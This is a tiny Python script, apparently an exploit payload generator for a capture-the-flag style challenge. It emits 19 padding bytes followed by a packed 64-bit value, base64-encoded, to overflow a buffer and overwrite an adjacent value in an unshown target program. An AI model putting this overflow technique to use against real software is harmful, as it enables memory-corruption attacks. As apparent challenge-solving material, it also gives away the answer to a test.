
import sys
import struct
import base64

buf = b'KKKKKKKKKKKKKKKKKKK'
buf += struct.pack('<Q', 10333120540899861173)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
